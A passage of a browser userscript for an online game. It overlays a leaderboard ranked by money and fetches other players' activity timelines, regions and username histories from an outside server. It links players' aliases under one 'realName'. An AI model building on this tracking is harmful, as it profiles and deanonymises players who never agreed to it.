(() => {
  if (window.__USERNAME_TRACKER__ && window.__USERNAME_TRACKER__.stop) {
    try { window.__USERNAME_TRACKER__.stop(); } catch (e) {}
  }

  let LB_BOX = null, LB_BODY = null, LB_STATUS = null, LB_VER = null;
  let TICK = null, MAP_INT = null;
  let __LAST_TOP__ = [];

  const UI_VER = (function(){
    try {
      const v = localStorage.getItem('db_core_ver_v1');
      if (v && /^\d+\.\d+\.\d+$/.test(v)) return 'v' + v;
    } catch (e) {}
    try { return 'v' + (GM_info && GM_info.script && (GM_info.script.version || '').replace(/^v?/, '')); }
    catch (e) { return 'v0.0.0'; }
  })();

  const USER_API_BASE = 'https://dbserver-8bhx.onrender.com/api/user';
  const GAME_API_BASE = USER_API_BASE.replace(/\/api\/user$/, '');
  let __MAP__ = { players: {} };

  const ACT_API_BASE = GAME_API_BASE + '/api/overlay/activity';
  let ACT_WINDOW = '1h';
  const ACT_CACHE = new Map();

  const ACT_SPECS = {
    '1h': { binMs:  5 * 60 * 1000, count: 12 },
    '1d': { binMs: 60 * 60 * 1000, count: 24 },
    '1w': { binMs: 12 * 60 * 60 * 1000, count: 14 },
    '1m': { binMs: 24 * 60 * 60 * 1000, count: 30 }
  };
  function alignWindowStartLocal(now, binMs, count){
    var off = (new Date().getTimezoneOffset()) * 60 * 1000;
    var localNow = now - off;
    var alignedRight = Math.floor(localNow / binMs) * binMs;
    var startLocal = alignedRight - (count - 1) * binMs;
    return startLocal + off;
  }

  function drawLargeWithPattern(container, bins, startMs, binMs){
    container.innerHTML = '';

    var cssW = Math.max(240, (container.clientWidth || parseInt(container.style.width || '0',10) || 300));
    var baseH = Math.max(28, (container.clientHeight || 28));
    var labelH = 12, gap = 3;
    var h = Math.max(baseH, 22 + gap + labelH);
    var dpr = Math.max(1, Math.floor(window.devicePixelRatio || 1));

    var cvs = document.createElement('canvas');
    cvs.style.width  = Math.round(cssW) + 'px';
    cvs.style.height = Math.round(h) + 'px';
    cvs.width  = Math.round(cssW * dpr);
    cvs.height = Math.round(h   * dpr);
    container.appendChild(cvs);

    var ctx = cvs.getContext('2d', { willReadFrequently:true });
    ctx.scale(dpr, dpr);

    var w = Math.round(cssW);
    var plotH = h - labelH - gap;
    var N = bins.length;

    ctx.clearRect(0,0,w,h);
    ctx.fillStyle = 'rgba(255,255,255,.12)';
    ctx.fillRect(0,0,w,plotH);

    var x = new Array(N+1);
    for (var i=0;i<=N;i++) x[i] = Math.round(i * w / N);

    ctx.fillStyle = '#4ade80';
    for (var i2=0;i2<N;i2++){
      if (bins[i2] !== '1') continue;
      var x0 = x[i2], x1 = x[i2+1], ww = Math.max(1, x1 - x0);
      ctx.fillRect(x0, 0, ww, plotH);
    }

    var ptn = document.createElement('canvas'); ptn.width=6; ptn.height=6;
    var pc = ptn.getContext('2d');
    pc.globalAlpha=0.25; pc.fillStyle='#fff'; pc.fillRect(0,0,6,6);
    pc.globalAlpha=1; pc.strokeStyle='rgba(0,0,0,.35)'; pc.beginPath(); pc.moveTo(0,6); pc.lineTo(6,0); pc.stroke();
    var hatch = ctx.createPattern(ptn,'repeat');
    for (var i3=0;i3<N;i3++){
      if (bins[i3] !== '1') continue;
      var x02 = x[i3], x12 = x[i3+1], ww2 = Math.max(1, x12 - x02);
      ctx.fillStyle = hatch;
      ctx.fillRect(x02, 0, ww2, plotH);
    }

    ctx.fillStyle = 'rgba(0,0,0,.32)';
    for (var i4=1;i4<N;i4++) ctx.fillRect(x[i4], 0, 1, plotH);

    ctx.font = '10px ui-monospace, Menlo, Consolas, monospace';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'top';
    ctx.fillStyle = 'rgba(255,255,255,.9)';

    function fmt1h(d){ return d.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' }); }
    function fmt1d(d){ return d.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' }); }
    function fmt1m(d){ var mo=String(d.getMonth()+1).padStart(2,'0'); var da=String(d.getDate()).padStart(2,'0'); return mo+'/'+da; }

    var lastX = -1e9;
    for (var i5=0;i5<=N;i5++){
      var t = new Date(startMs + i5*binMs);
      var label = '';
      if (binMs === 5*60*1000)        label = fmt1h(t);
      else if (binMs === 60*60*1000)  label = fmt1d(t);
      else if (binMs === 24*60*60*1000) label = fmt1m(t);
      if (!label) continue;
      var xi = x[i5];
      var tw = ctx.measureText(label).width;
      if (xi - lastX < tw + 8) continue;
      ctx.fillText(label, xi, plotH + 2);
      lastX = xi;
    }
  }

  function attachTimelineHover(root, container, startMs, binMs, meta, binsString){
    var tip = document.getElementById('ub-activity-tip');
    if (!tip) {
      tip = document.createElement('div');
      tip.id = 'ub-activity-tip';
      tip.style.cssText = [
        'position:fixed','pointer-events:none','background:rgba(0,0,0,.95)','color:#fff',
        'border:1px solid rgba(255,255,255,.16)','border-radius:8px','padding:8px 10px',
        'font-size:11px','line-height:1.25','box-shadow:0 8px 20px rgba(0,0,0,.5)',
        'display:none','z-index:2147483647','width:200px','min-height:74px','box-sizing:border-box','white-space:normal'
      ].join(';');
      document.body.appendChild(tip);
    }

    var cvs = container.querySelector('canvas');
    if (!cvs) return;

    var bins = typeof binsString === 'string' ? binsString : '';
    var N = meta ? meta.length : (bins ? bins.length : 0);

    function update(e){
      if (!N) return;
      var rCanvas = cvs.getBoundingClientRect();
      var idx = Math.min(N-1, Math.max(0, Math.floor((e.clientX - rCanvas.left) / (rCanvas.width / N))));
      var a = new Date(startMs + idx*binMs);
      var b = new Date(a.getTime() + binMs);
      var m = meta ? meta[idx] : null;
      var active = bins ? (bins[idx] === '1') : Boolean(m && m.pings);
      var topUser = (m && m.topUsername) ? m.topUsername : '—';
      var pings   = (m && typeof m.pings === 'number') ? m.pings : (active ? '—' : 0);
      var region  = (m && m.topRegion) ? (m.topRegion + ' (' + ((m.topRegionPings|0)) + ')') : '—';

      var dStr = a.toLocaleDateString();
      var t1 = a.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' });
      var t2 = b.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' });

      tip.innerHTML =
        '<div style=\"font-weight:700;margin-bottom:2px;white-space:nowrap\">'+dStr+'</div>' +
        '<div style=\"margin-bottom:6px;white-space:nowrap\">'+t1+' – '+t2+'</div>' +
        '<div style=\"display:flex;justify-content:space-between\"><span>Top&nbsp;User:</span><span style=\"max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap\">'+topUser+'</span></div>' +
        '<div style=\"display:flex;justify-content:space-between\"><span>Pings:</span><span>'+pings+'</span></div>' +
        '<div style=\"display:flex;justify-content:space-between\"><span>Region:</span><span>'+region+'</span></div>';

      tip.style.display = 'block';

      var PAD = 12, TW = 200;
      var VW = innerWidth, VH = innerHeight;
      var TH = Math.max(74, tip.offsetHeight);

      var left = e.clientX + PAD;
      var top  = e.clientY + PAD;
      if (left + TW + 8 > VW) left = e.clientX - PAD - TW;
      if (top + TH + 8 > VH) top = e.clientY - PAD - TH;
      left = Math.min(Math.max(8, left), VW - TW - 8);
      top  = Math.min(Math.max(8, top),  VH - TH - 8);
      tip.style.left = Math.round(left) + 'px';
      tip.style.top  = Math.round(top)  + 'px';
    }
    function hide(){ tip.style.display = 'none'; }

    if (cvs.__ubMove) {
      cvs.removeEventListener('mousemove', cvs.__ubMove);
      cvs.removeEventListener('mouseleave', cvs.__ubLeave);
    }
    cvs.__ubMove = update;
    cvs.__ubLeave = hide;
    cvs.addEventListener('mousemove', update);
    cvs.addEventListener('mouseleave', hide);
  }

  function fetchActivity(ids) {
    var tzOffsetMin = new Date().getTimezoneOffset();
    var url = ACT_API_BASE +
      '/batch?window=' + encodeURIComponent(ACT_WINDOW) +
      '&tzOffsetMin=' + tzOffsetMin;

    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ids: ids })
    })
    .then(function (r) { return r.json(); })
    .then(function (j) {
      if (!j || j.ok !== true) throw new Error('activity error');
      return j;
    });
  }

  function startActivityRefreshLoop(getTop){
    var timer = null;
    function tickOnce(){
      try {
        var top = getTop() || [];
        var ids = (Array.isArray(top) ? top : []).map(function(p){return p.privyId;}).filter(Boolean).slice(0,50);
        if (!ids.length) return;
        return fetchActivity(ids).then(function (resp) {
          var data    = resp.data;
          var startMs = resp.startMs;
          var binMs   = resp.binMs;
          var now     = Date.now();
          for (var i = 0; i < ids.length; i++) {
            var id = ids[i];
            ACT_CACHE.set(ACT_WINDOW + ':' + id, { bins: data[id], startMs: startMs, binMs: binMs, ts: now });
          }
        }).catch(function(){});
      } catch (e) {}
    }
    window.__ACT_TICK__ = tickOnce;
    if (timer) clearInterval(timer);
    tickOnce();
    timer = setInterval(tickOnce, 15000);
  }

  function saveActivityBoxPos(box){
    try{
      var snap = { left: box.style.left || '', top: box.style.top || '', right: box.style.right || '' };
      localStorage.setItem('ub_activity_box_pos', JSON.stringify(snap));
    }catch(e){}
  }
  function restoreActivityBoxPos(box){
    try{
      var raw = localStorage.getItem('ub_activity_box_pos');
      if (!raw) return false;
      var pos = JSON.parse(raw);
      if (!pos) return false;
      if (pos.left && pos.top) {
        box.style.left = pos.left;
        box.style.top  = pos.top;
        box.style.right = 'auto';
        return true;
      }
    }catch(e){}
    return false;
  }

  function showActivityBox(privyId, displayLabel){
    var old = document.getElementById('ub-activity-box'); if (old) old.remove();
    var lb = document.getElementById('username-leaderboard');
    var lbw = lb ? lb.getBoundingClientRect().width : 300;
    var W = Math.min(720, Math.max(260, Math.floor(lbw + 24)));

    var box = document.createElement('div');
    box.id='ub-activity-box';
    box.style.cssText=[
      'position:fixed','right:24px','top:72px','background:rgba(0,0,0,.95)','color:#fff',
      'border:1px solid rgba(255,255,255,.16)','border-radius:12px','padding:12px','padding-top:28px',
      'z-index:2147483646','min-width:'+W+'px','box-shadow:0 12px 32px rgba(0,0,0,.6)','user-select:none'
    ].join(';');

    box.innerHTML = '<div id=\"ub-activity-head\" style=\"display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;cursor:move\">'+
      '<div style=\"font-weight:700\">'+(displayLabel||'Player')+'</div>'+
      '<div>'+
        ['1h','1d','1w','1m'].map(function(k){return '<button data-k=\"'+k+'\" style=\"margin-left:4px;border:1px solid rgba(255,255,255,.28);background:rgba(0,0,0,.35);color:#fff;border-radius:4px;padding:1px 6px;font-size:11px;line-height:1.15;height:20px;cursor:pointer;'+(k===ACT_WINDOW?'outline:1.5px solid rgba(74,222,128,.85)':'')+'\">'+k+'</button>';}).join('')+
        '<button id=\"ub-activity-close\" style=\"margin-left:8px;border:1px solid rgba(255,255,255,.25);background:rgba(0,0,0,.35);color:#fff;border-radius:4px;padding:1px 8px;font-size:11px;height:20px;line-height:1.1;cursor:pointer\">✕</button>'+
      '</div>'+
    '</div>'+
    '<div id=\"ub-activity-cvs\" style=\"height:36px;position:relative\"></div>';

    document.body.appendChild(box);

    var dragDecor = document.createElement('div');
    dragDecor.className = 'db-top-drag';
    dragDecor.style.pointerEvents = 'auto';
    dragDecor.title = 'Drag';
    box.appendChild(dragDecor);

    var head = box.querySelector('#ub-activity-head');
    Array.prototype.forEach.call(head.querySelectorAll('button'), function(b){ b.style.cursor='pointer'; });

    function bindDragSource(src, ignoreButtons){
      var dragging=false, sx=0, sy=0, ox=0, oy=0;
      function down(e){
        if (e.button !== undefined && e.button !== 0) return;
        if (ignoreButtons && e.target && e.target.closest && e.target.closest('button')) return;
        var p = e.touches ? e.touches[0] : e;
        dragging = true; sx = p.clientX; sy = p.clientY;
        var r = box.getBoundingClientRect(); ox = r.left; oy = r.top;
        var cs = getComputedStyle(box);
        if (cs.right !== 'auto') { box.style.left = r.left + 'px'; box.style.top = r.top + 'px'; box.style.right = 'auto'; }
        e.preventDefault();
      }
      function move(e){
        if (!dragging) return;
        var p = e.touches ? e.touches[0] : e;
        var nx = Math.max(0, Math.min(innerWidth  - box.offsetWidth,  ox + (p.clientX - sx)));
        var ny = Math.max(0, Math.min(innerHeight - box.offsetHeight, oy + (p.clientY - sy)));
        box.style.left = nx + 'px';
        box.style.top  = ny + 'px';
      }
      function up(){ if (dragging) saveActivityBoxPos(box); dragging = false; }

      src.addEventListener('mousedown',  down, { passive:false });
      window.addEventListener('mousemove', move, { passive:false });
      window.addEventListener('mouseup',   up,   { passive:true });
      src.addEventListener('touchstart',  down, { passive:false });
      window.addEventListener('touchmove', move, { passive:false });
      window.addEventListener('touchend',  up,   { passive:true });
    }

    bindDragSource(head, true);
    bindDragSource(dragDecor, false);

    box.querySelector('#ub-activity-close').onclick=function(){ box.remove(); };
    Array.prototype.forEach.call(box.querySelectorAll('button[data-k]'), function(b){
      b.onclick = function(){
        saveActivityBoxPos(box);
        ACT_WINDOW = b.dataset.k;
        showActivityBox(privyId, displayLabel);
      };
    });

    restoreActivityBoxPos(box);

    (function drawImmediate(){
      var spec = ACT_SPECS[ACT_WINDOW] || { binMs: 5*60*1000, count:12 };
      var _wrap = box.querySelector('#ub-activity-cvs');
      var _start = alignWindowStartLocal(Date.now(), spec.binMs, spec.count);
      var _bins = ''.padStart(spec.count, '0');
      drawLargeWithPattern(_wrap, _bins, _start, spec.binMs);
      attachTimelineHover(box, _wrap, _start, spec.binMs, null, _bins);
    })();

    fetchActivity([privyId]).then(({data, meta, startMs, binMs})=>{
  const _wrap = box.querySelector('#ub-activity-cvs');
  const _bins = (data && data[privyId]) ? data[privyId] : ''.padStart(12,'0');
  const _meta = (meta && meta[privyId]) ? meta[privyId] : null;

  drawLargeWithPattern(_wrap, _bins, startMs, binMs);
  attachTimelineHover(box, _wrap, startMs, binMs, _meta, _bins);

  console.log('[ACT:box] ok', { window: ACT_WINDOW, id: privyId, binsLen: _bins.length, hasMeta: !!_meta });
}).catch((e)=>{ console.warn('[ACT:box] fail', e); });
  }

  function resolveServerKey() {
    var sid = new URLSearchParams(location.search).get('serverId') || '';
    var m = sid.match(/^(us|eu)-(1|5|20)/i);
    var region = m ? m[1].toLowerCase() : 'us';
    var amount = m ? m[2] : '1';
    return { region: region, amount: amount, serverKey: region + '-' + amount };
  }
  function parseServerId() {
    var sid = new URLSearchParams(location.search).get('serverId') || '';
    var m = sid.match(/^(us|eu)-(1|5|20)\b/i);
    if (m) return { region: m[1].toLowerCase(), amount: m[2] };
    return { region: 'us', amount: '1' };
  }
  function playersEndpoint() {
    var s = parseServerId();
    return 'https://damnbruh-game-server-instance-' + s.amount + '-' + s.region + '.onrender.com/players';
  }
  function normalizeFilterSort(arr) {
    var out = [];
    for (var i=0;i<arr.length;i++) {
      var p = arr[i];

      var name =
        (typeof p.name === 'string' && p.name) ? p.name :
        (typeof p.username === 'string' && p.username) ? p.username :
        (typeof p.playerName === 'string' && p.playerName) ? p.playerName :
        '#' + (i + 1);

      var privyId =
        (p.privyId != null) ? p.privyId :
        (p.id != null) ? p.id :
        (p.playerId != null) ? p.playerId : null;

      var sRaw = (p.size != null ? p.size : (p.snakeSize != null ? p.snakeSize : (p.length != null ? p.length : 0)));
      var mvRaw = (p.monetaryValue != null ? p.monetaryValue : (p.value != null ? p.value : (p.money != null ? p.money : (p.cash != null ? p.cash : 0))));

      var sizeNum = Number(sRaw); if (!isFinite(sizeNum)) sizeNum = 0;
      var mvNum   = Number(mvRaw); if (!isFinite(mvNum))   mvNum   = 0;

      if (mvNum > 0 && sizeNum > 2) {
        out.push({ name: name, privyId: privyId, size: sizeNum, monetaryValue: mvNum });
      }
    }
    out.sort(function(a,b){
      return (b.monetaryValue||0)-(a.monetaryValue||0) || (b.size||0)-(a.size||0) || String(a.name||'').localeCompare(String(b.name||''));
    });
    return out;
  }

  function ensureAlertStyles() {
    if (document.getElementById('db-alert-style')) return;
    var s = document.createElement('style');
    s.id = 'db-alert-style';
    s.textContent = "\
.db-alerts{position:fixed;right:16px;bottom:16px;display:flex;flex-direction:column;gap:8px;z-index:2147483647}\
.db-alert{background:#000;color:#fff;border:2px solid #ffd400;border-radius:12px;box-shadow:0 6px 24px rgba(0,0,0,.35);width:min(340px,92vw);padding:12px 14px;white-space:pre-wrap;word-break:break-word;opacity:0;transform:translateY(8px);transition:opacity .25s ease, transform .25s ease}\
.db-alert.show{opacity:1;transform:translateY(0)}\
.db-alert.hide{opacity:0;transform:translateY(6px)}\
.db-alert-title{font-weight:700;letter-spacing:.3px;margin-bottom:6px;align-items:center;color:#ffd400}\
.db-alert-body{font:13px ui-monospace, Menlo, Consolas, monospace;line-height:1.35;align-items:center}\
@media (max-width:480px){.db-alert{right:8px;bottom:8px}}";
    document.head.appendChild(s);
  }
  function dbAlertContainer(){
    var c = document.querySelector('.db-alerts');
    if (!c){ c = document.createElement('div'); c.className = 'db-alerts'; document.body.appendChild(c); }
    return c;
  }
  function dbShowAlertToast(msg){
    var card = document.createElement('div');
    card.className = 'db-alert';
    var title = document.createElement('div'); title.className = 'db-alert-title'; title.textContent = 'ALERT:';
    var body  = document.createElement('div'); body.className  = 'db-alert-body';  body.textContent  = String(msg || '');
    card.appendChild(title); card.appendChild(body);
    dbAlertContainer().appendChild(card);
    requestAnimationFrame(function(){ card.classList.add('show'); });
    function hide(){ card.classList.add('hide'); setTimeout(function(){ card.remove(); }, 450); }
    var timer = setTimeout(hide, 5500);
    card.addEventListener('click', function(){ clearTimeout(timer); hide(); }, { once:true });
  }
  function dbGetClientKey(){
    try{
      var rawLS = localStorage.getItem('damnbruh_username_keys');
      var rawGM = (typeof GM_getValue==='function') ? GM_getValue('damnbruh_username_keys', null) : null;
      var raw = (rawLS != null ? rawLS : rawGM);
      if (raw){
        var obj = (typeof raw==='string') ? JSON.parse(raw) : raw;
        if (obj && typeof obj.username_script_key==='string' && obj.username_script_key) return obj.username_script_key;
      }
    }catch(e){}
    return null;
  }
  function dbSeenStore(get){
    var k='db_seen_alerts_v1';
    if (get){
      try{ return JSON.parse(localStorage.getItem(k) || '{}'); }catch(e){return{}}
    } else {
      return {
        add:function(uid){ try{
          var m = dbSeenStore(true); m[uid]=Date.now();
          var entries = Object.entries(m).sort(function(a,b){return a[1]-b[1]}).slice(-200);
          localStorage.setItem('db_seen_alerts_v1', JSON.stringify(Object.fromEntries(entries)));
        }catch(e){} }
      };
    }
  }
  function dbAlertUid(a){
    var cand = (a && (a.id||a.uuid||a.uid||a.ts||a.timestamp||a.time||a.createdAt||a.expiresAt||a.message)) || Math.random();
    return String(cand).slice(0,128);
  }
  var DB_LAST_ALERT_TS = Number(localStorage.getItem('db_last_alert_ts_v1') || 0);
  async function dbPollAlerts() {
    var key = dbGetClientKey();
    if (!key) return;
    try {
      var res = await fetch(USER_API_BASE + '/alerts?key=' + encodeURIComponent(key), { cache: 'no-store' });
      if (!res.ok) return;
      var j = await res.json().catch(function(){ return null; });
      var arr = (j && Array.isArray(j.alerts)) ? j.alerts : (Array.isArray(j) ? j : []);
      if (!arr.length) return;

      var seen = dbSeenStore(true);
      var incoming = [];
      var maxTs = DB_LAST_ALERT_TS;

      for (var ai=0; ai<arr.length; ai++) {
        var a = arr[ai];
        var uid = dbAlertUid(a);
        var ts  = Number(a.id || a.timestamp || 0) || 0;
        if (ts > maxTs) maxTs = ts;
        if (!seen[uid] && ts > DB_LAST_ALERT_TS) incoming.push({ a: a, uid: uid, ts: ts });
      }
      incoming.sort(function(x,y){ return (x.ts||0)-(y.ts||0); });
      for (var bi=0; bi<incoming.length; bi++) {
        var rec = incoming[bi];
        if (rec.a && rec.a.message) dbShowAlertToast(rec.a.message);
        dbSeenStore().add(rec.uid);
        if (rec.ts > DB_LAST_ALERT_TS) DB_LAST_ALERT_TS = rec.ts;
      }
      if (maxTs > DB_LAST_ALERT_TS) DB_LAST_ALERT_TS = maxTs;
      localStorage.setItem('db_last_alert_ts_v1', String(DB_LAST_ALERT_TS));
    } catch (e) {}
  }

  let INFO_BOX = null, INFO_HEADER = null, INFO_BODY = null;
  function createUsernameInfoBox() {
    if (INFO_BOX && INFO_BOX.isConnected) return INFO_BOX;
    var box = document.createElement("div");
    box.id = "username-info-box";
    Object.assign(box.style, {
      position:"fixed", zIndex:2147483647, left:"16px", top:"16px",
      padding:"12px 14px", paddingTop:"19px", minWidth:"160px",
      fontFamily:'ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace',
      fontSize:"13px", color:"#fff", background:"rgba(0,0,0,.65)", backdropFilter:"blur(6px)",
      border:"1px solid rgba(255,255,255,.12)", borderRadius:"12px", boxShadow:"0 6px 18px rgba(0,0,0,.35)", opacity:"1"
    });
    box.innerHTML = '\
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;user-select:none;">\
        <div style="display:flex;align-items:center;gap:10px;">\
          <div style="width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 10px rgba(34,197,94,.9)"></div>\
          <div id="username-info-header" style="opacity:.9;letter-spacing:.06em;font-weight:700">Unknown</div>\
        </div>\
        <button id="username-info-close" style="background:none;border:none;color:#fff;opacity:.7;cursor:pointer;font-size:13px;">✖</button>\
      </div>\
      <div id="username-info-body" style="display:grid;grid-template-columns:1fr auto;row-gap:6px;column-gap:10px;"></div>\
    ';
    var drag = document.createElement("div");
    drag.className = "db-top-drag";
    box.appendChild(drag);
    document.body.appendChild(box);

    var dragging=false,sx=0,sy=0,ox=0,oy=0;
    function down(e){ var p=e.touches?e.touches[0]:e; dragging=true; sx=p.clientX; sy=p.clientY; var r=box.getBoundingClientRect(); ox=r.left; oy=r.top; e.preventDefault();}
    function move(e){ if(!dragging) return; var p=e.touches?e.touches[0]:e; var nx=Math.max(0,Math.min(innerWidth-40, ox+(p.clientX-sx))); var ny=Math.max(0,Math.min(innerHeight-40, oy+(p.clientY-sy))); box.style.left=nx+"px"; box.style.top=ny+"px"; }
    function up(){ dragging=false; saveInfoBoxPos(); }
    drag.addEventListener("mousedown", down);
    drag.addEventListener("touchstart", down, { passive: false });
    addEventListener("mousemove", move, { passive: false });
    addEventListener("touchmove", move, { passive: false });
    addEventListener("mouseup", up, { passive: true });
    addEventListener("touchend", up, { passive: true });

    INFO_BOX   = box;
    INFO_HEADER= box.querySelector("#username-info-header");
    INFO_BODY  = box.querySelector("#username-info-body");
    box.querySelector("#username-info-close").addEventListener("click", hideUsernameInfo);

    restoreInfoBoxPos();
    return box;
  }
  function restoreInfoBoxPos(){
    try{
      var saved = JSON.parse(localStorage.getItem("username_info_box_pos") || "{}");
      if (saved.left && saved.top && INFO_BOX) Object.assign(INFO_BOX.style, { left:saved.left, top:saved.top });
    } catch (e) {}
  }
  function saveInfoBoxPos(){
    if (!INFO_BOX) return;
    var snapshot = { left: INFO_BOX.style.left, top: INFO_BOX.style.top };
    localStorage.setItem("username_info_box_pos", JSON.stringify(snapshot));
  }
  function showUsernameInfo(mapInfo){
    var box = createUsernameInfoBox();
    var headerText = (mapInfo && mapInfo.realName) ? mapInfo.realName : "Unknown";
    var usernames = (mapInfo && (mapInfo.allUsernames || mapInfo.usernames)) || {};
    var sorted = Object.entries(usernames).sort(function(a,b){return b[1]-a[1]}).slice(0,3);
    INFO_HEADER.textContent = headerText;
    INFO_BODY.replaceChildren();
    if (sorted.length === 0) {
      var none = document.createElement("div");
      none.textContent = "No usernames recorded.";
      none.style.opacity = ".7";
      none.style.gridColumn = "1 / -1";
      INFO_BODY.appendChild(none);
    } else {
      for (var i=0;i<sorted.length;i++) {
        var name = sorted[i][0], count = sorted[i][1];
        var n = document.createElement("div"); n.textContent = name;
        var c = document.createElement("div"); c.style.color = "#4ade80"; c.style.fontWeight = "700"; c.textContent = count;
        INFO_BODY.appendChild(n); INFO_BODY.appendChild(c);
      }
    }
  }
  function hideUsernameInfo(){
    if (!INFO_BOX || !INFO_BOX.isConnected) return;
    INFO_BOX.parentNode.removeChild(INFO_BOX);
    INFO_BOX = INFO_HEADER = INFO_BODY = null;
  }

  function injectStyles() {
    if (document.getElementById('dbk-styles-usernames')) return;
    var s = document.createElement('style');
    s.id = 'dbk-styles-usernames';
    s.textContent = "\
#username-leaderboard{position:fixed;z-index:2147483646;left:16px;top:16px;width:220px;color:#fff;background:rgba(0,0,0,.75);border:1px solid rgba(255,255,255,.12);border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,.35);font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px;line-height:1.35;padding:10px 12px 8px;backdrop-filter:blur(6px)}\
#username-leaderboard-header{position:relative;padding-top:14px;text-align:left;font-weight:700;letter-spacing:.06em;margin-bottom:8px;padding-left:28px}\
#username-leaderboard-header::before{content:'';position:absolute;width:10px;height:10px;left:5px;top:17.5px;background:#22c55e;border-radius:50%;box-shadow:0 0 6px #22c55e}\
.ub-top-drag{width:44px;position:absolute;top:-1px;left:50%;transform:translateX(-50%);height:8px;border-radius:6px;background:rgba(255,255,255,.12);cursor:move;box-shadow:0 0 10px rgba(0,0,0,.8)}\
.ub-row{display:flex;align-items:center;justify-content:space-between;padding:4px 0;border-top:1px solid rgba(255,255,255,.08)}\
.ub-row:first-of-type{border-top:none}\
.ub-left{display:flex;align-items:center;gap:6px;min-width:0}\
.ub-rank{color:#fff;opacity:.9;font-weight:700}\
.ub-medal{font-size:12px}\
.ub-name{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:140px}\
.ub-hint{color:#4ade80;font-weight:600;font-size:12px;margin-left:8px}\
.ub-footer{margin-top:8px;padding-top:6px;border-top:1px solid rgba(255,255,255,.12);font-size:12px;display:flex;align-items:center;justify-content:space-between;opacity:.7}\
.ub-top3-wrap{position:relative;margin-left:6px}\
.ub-top3-icon{cursor:pointer;font-size:11px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.16);border-radius:4px;padding:0 4px;line-height:1.2}\
.ub-top3-popup{position:absolute;left:50%;transform:translateX(-50%);top:120%;min-width:160px;background:rgba(0,0,0,.92);color:#fff;border:1px solid rgba(255,255,255,.16);border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,.7);padding:8px;font-size:11px;display:none;z-index:99999;white-space:normal}\
.ub-top3-title{font-weight:700;margin-bottom:4px;opacity:.9}\
.ub-top3-line{display:flex;justify-content:space-between;gap:6px}\
.ub-top3-name{max-width:110px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}\
.ub-top3-count{color:#4ade80;font-weight:600}\
.ub-top3-wrap:hover .ub-top3-popup{display:block}\
.db-top-drag{position:absolute; top:6px; left:50%; transform:translateX(-50%); width:44px; height:8px; border-radius:6px; background:rgba(255,255,255,.12); cursor:move; z-index:2; box-shadow:0 0 10px rgba(0,0,0,.8);}\
#ub-status{opacity:.88} #ub-ver{opacity:.75}\
#ub-activity-box { padding-top: 28px; }\
";
    document.head.appendChild(s);
  }

  function ensureBox() {
    injectStyles();

    LB_BOX = document.getElementById('username-leaderboard') || LB_BOX;

    if (!LB_BOX) {
      LB_BOX = document.createElement('div');
      LB_BOX.id = 'username-leaderboard';
      LB_BOX.innerHTML = '\
        <div id="username-leaderboard-header">\
          <div class="ub-top-drag"></div>\
          TRUE LEADERBOARD\
        </div>\
        <div id="ub-body"></div>\
        <div class="ub-footer"><span id="ub-status">Starting…</span><span id="ub-ver">dev</span></div>\
      ';
      document.body.appendChild(LB_BOX);
      restoreLeaderboardPos();
    }

    LB_BODY  = LB_BOX.querySelector('#ub-body');
    LB_STATUS= LB_BOX.querySelector('#ub-status');
    LB_VER   = LB_BOX.querySelector('#ub-ver');
    if (LB_VER) LB_VER.textContent = UI_VER;

    var pill = LB_BOX.querySelector('.ub-top-drag');
    if (!pill.__dragBound__) {
      var dragging=false,sx=0,sy=0,ox=16,oy=16;
      function down(e){ dragging=true; var p=e.touches?e.touches[0]:e; sx=p.clientX; sy=p.clientY; var r=LB_BOX.getBoundingClientRect(); ox=r.left; oy=r.top; e.preventDefault(); }
      function move(e){ if(!dragging) return; var p=e.touches?e.touches[0]:e; var nx=Math.max(0,Math.min(innerWidth-40,  ox+(p.clientX-sx))); var ny=Math.max(0,Math.min(innerHeight-40, oy+(p.clientY-sy))); LB_BOX.style.left=nx+'px'; LB_BOX.style.top=ny+'px'; }
      function up(){ dragging=false; saveLeaderboardPos(); }
      pill.addEventListener('mousedown',down,{passive:false});
      addEventListener('mousemove',move,{passive:false});
      addEventListener('mouseup',up,{passive:true});
      pill.addEventListener('touchstart',down,{passive:false});
      addEventListener('touchmove',move,{passive:false});
      addEventListener('touchend',up,{passive:true});
      pill.__dragBound__ = true;
    }
  }
  function row(textLeft, rankText){
    if (rankText == null) rankText = '-';
    var row = document.createElement('div'); row.className = 'ub-row';
    var left = document.createElement('div'); left.className = 'ub-left';
    var rnk = document.createElement('div'); rnk.className = 'ub-rank'; rnk.textContent = rankText;
    var nm  = document.createElement('div'); nm.className = 'ub-name'; nm.textContent = textLeft;
    left.appendChild(rnk); left.appendChild(nm); row.appendChild(left);
    var right = document.createElement('div'); right.className = 'ub-hint'; right.textContent = '';
    row.appendChild(right);
    return row;
  }
  function restoreLeaderboardPos(){
    try{
      var saved = JSON.parse(localStorage.getItem("leaderboard_box_pos") || "{}");
      if (saved.left && saved.top && LB_BOX) Object.assign(LB_BOX.style, { left:saved.left, top:saved.top });
    } catch (e) {}
  }
  function saveLeaderboardPos(){
    if (!LB_BOX) return;
    var snapshot = { left: LB_BOX.style.left, top: LB_BOX.style.top };
    localStorage.setItem("leaderboard_box_pos", JSON.stringify(snapshot));
  }

  function render(players, mapping) {
    if (!LB_BOX || !LB_BOX.isConnected) return;
    mapping = mapping || __MAP__;
    var map = (mapping && mapping.players) ? mapping.players : {};
    LB_BODY.replaceChildren();

    var notInGame = !location.pathname.includes('/game');
    if (notInGame) {
      LB_BODY.appendChild(row('No lobby found', '-'));
      if (LB_STATUS) LB_STATUS.textContent = 'Not in Game';
      if (LB_VER) LB_VER.textContent = UI_VER;
